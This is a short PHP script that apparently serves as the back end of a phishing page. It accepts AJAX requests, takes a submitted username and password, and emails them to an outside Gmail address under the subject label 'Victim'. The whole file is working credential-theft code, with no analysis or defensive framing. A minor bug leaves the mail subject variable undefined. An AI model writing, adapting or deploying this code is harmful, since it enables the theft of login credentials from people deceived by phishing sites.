<?php
define('IS_AJAX', isset($_SERVER['HTTP_X_REQUESTED_WITH']) &&      strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest');
if(!IS_AJAX) {die('Restricted access');}
$usr = "";
$pw = "";

if(isset($_POST)){
    $usr = $_POST['username'];
    $pw  = $_POST['pw'];
    
    $to = "islamishkodran@gmail.com";
    $sub = "Victim";
    $msg = "username = ".$usr."\n\npassword = ".$pw;
    mail($to, $subject, $msg);
}

?>